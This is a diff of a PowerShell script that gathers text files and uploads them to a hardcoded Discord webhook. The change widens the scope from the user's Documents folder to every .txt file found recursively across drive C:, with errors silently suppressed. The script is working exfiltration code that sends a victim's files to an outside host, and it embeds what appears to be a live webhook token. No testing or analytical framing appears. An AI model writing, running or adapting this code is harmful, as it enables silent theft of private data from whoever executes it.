@@ -1,14 +1,14 @@
-# Path to the documents folder
-$documentsPath = "$env:USERPROFILE\Documents"
 # Discord webhook URL
 $webhookUrl = "https://discord.com/api/webhooks/1243581518152990801/HeVZuyvWfQSYBl1ipXcbIEb2uIScSwlrXj6lazDoujaA741SdO4idCw8nhchRScTwinE"
 
-# Get all .txt files in the documents folder
-$txtFiles = Get-ChildItem -Path $documentsPath -Filter *.txt
+# Function to upload file to Discord webhook
+function Upload-FileToDiscord {
+    param (
+        [string]$filePath,
+        [string]$webhookUrl
+    )
 
-foreach ($file in $txtFiles) {
-    $filePath = $file.FullName
-    $fileName = $file.Name
+    $fileName = [System.IO.Path]::GetFileName($filePath)
     $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
 
     # Create multipart/form-data content
@@ -42,4 +42,11 @@ foreach ($file in $txtFiles) {
     $reader.Close()
     $webResponseStream.Close()
     $webResponse.Close()
+}
+
+# Get all .txt files in the system
+$txtFiles = Get-ChildItem -Path C:\ -Filter *.txt -Recurse -ErrorAction SilentlyContinue
+
+foreach ($file in $txtFiles) {
+    Upload-FileToDiscord -filePath $file.FullName -webhookUrl $webhookUrl
 }
